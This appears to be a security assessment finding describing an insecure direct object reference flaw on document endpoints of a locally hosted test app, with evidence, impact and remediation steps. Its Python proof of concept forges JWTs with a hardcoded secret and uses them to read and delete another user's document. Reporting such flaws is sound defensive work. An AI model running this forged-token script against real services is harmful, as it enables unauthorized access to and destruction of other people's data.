# IDOR - Insecure Direct Object Reference on Document Endpoints

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-08-02 12:17:46 UTC
**Target:** http://host.docker.internal:5000
**CWE:** CWE-639
**CVSS:** 8.8
**Fix Effort:** Medium

## Description

Document endpoints lack authorization checks. Any authenticated user can access, modify, or delete any document regardless of ownership.

## Evidence

User2 accessed User1's document (id=1):
- GET /api/documents/1: Status 200
- DELETE /api/documents/delete/1: Status 200

No ownership verification exists in code.

## Impact

Users can read, modify, and delete other users' documents. Leads to data breach, data tampering, and data destruction.

## Technical Analysis

The document endpoints use require_auth which only checks for a valid JWT token but does not verify user ownership. The code retrieves documents without checking the user_id claim against the document's owner.

## Proof of Concept

1. Authenticate as user1 and create a document (id=1)
2. Authenticate as user2 and access document 1 by ID
3. Observe successful access without authorization check
4. Delete document as user2 and confirm deletion

```
import jwt
import requests

SECRET = "super-secret-jwt-key-123"
token1 = jwt.encode({"user_id": 1, "username": "user1"}, SECRET, algorithm="HS256")
token2 = jwt.encode({"user_id": 2, "username": "user2"}, SECRET, algorithm="HS256")

# Create doc as user1
headers1 = {"Authorization": f"Bearer {token1}"}
create_resp = requests.post("http://host.docker.internal:5000/api/documents/save",
    json={"filename": "secret.pdf", "content": "Secret"}, headers=headers1)
doc_id = create_resp.json().get('id')

# Access as user2
headers2 = {"Authorization": f"Bearer {token2}"}
resp = requests.get(f"http://host.docker.internal:5000/api/documents/{doc_id}", headers=headers2)
print(f"Status: {resp.status_code}")  # 200

# Delete as user2
resp = requests.delete(f"http://host.docker.internal:5000/api/documents/delete/{doc_id}", headers=headers2)
print(f"Delete Status: {resp.status_code}")  # 200
```

## Remediation

1. Add authorization checks to all document endpoints
2. Verify authenticated user's user_id matches document's user_id
3. Return 403 Forbidden for unauthorized access
4. Implement centralized authorization middleware

## Assumptions

Attacker has a valid JWT token for any user account.
